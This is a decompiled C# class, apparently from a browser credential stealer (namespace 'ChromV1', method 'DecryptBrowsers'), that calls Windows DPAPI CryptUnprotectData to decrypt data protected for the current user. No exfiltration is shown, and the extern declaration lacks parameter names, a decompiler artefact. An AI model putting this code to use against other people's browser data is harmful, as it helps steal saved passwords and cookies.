using System;
using System.Runtime.InteropServices;

namespace ChromV1
{
	// Token: 0x0200005D RID: 93
	internal sealed class DecryptAPI
	{
		// Token: 0x06000202 RID: 514 RVA: 0x00010CF0 File Offset: 0x0000EEF0
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			DecryptAPI.DataBlob dataBlob = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob2 = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob3 = default(DecryptAPI.DataBlob);
			DecryptAPI.CryptprotectPromptstruct cryptprotectPromptstruct = new DecryptAPI.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(DecryptAPI.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch
				{
				}
				DecryptAPI.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000203 RID: 515
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DecryptAPI.DataBlob, ref string, ref DecryptAPI.DataBlob, IntPtr, ref DecryptAPI.CryptprotectPromptstruct, int, ref DecryptAPI.DataBlob);

		// Token: 0x02000244 RID: 580
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000A39 RID: 2617
			public int cbData;

			// Token: 0x04000A3A RID: 2618
			public IntPtr pbData;
		}

		// Token: 0x02000245 RID: 581
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000A3B RID: 2619
			public int cbSize;

			// Token: 0x04000A3C RID: 2620
			public int dwPromptFlags;

			// Token: 0x04000A3D RID: 2621
			public IntPtr hwndApp;

			// Token: 0x04000A3E RID: 2622
			public string szPrompt;
		}
	}
}
